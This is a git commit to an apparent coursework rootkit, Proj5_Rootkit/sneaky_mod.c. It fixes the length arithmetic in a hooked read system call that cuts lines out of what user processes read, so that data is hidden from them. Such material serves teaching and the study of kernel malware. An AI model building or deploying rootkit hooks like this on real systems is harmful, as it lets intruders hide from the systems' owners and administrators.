dca893909f92b99788badb5835970a7933be3aeb
yy <yueyang0115@outlook.com>
2020-04-11 22:43:48 -0400

    get back to original len

--- Proj5_Rootkit/sneaky_mod.c
+++ Proj5_Rootkit/sneaky_mod.c
@@ -118,7 +118,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
     if(line_end !=NULL){
       line_end++;
       memcpy(line_start, line_end, (char __user*)(buf + nread) - line_end);
-      nread -= (ssize_t)(line_end - line_start + 1);
+      nread -= (ssize_t)(line_end - line_start);
     }
   }
   return (ssize_t)nread;
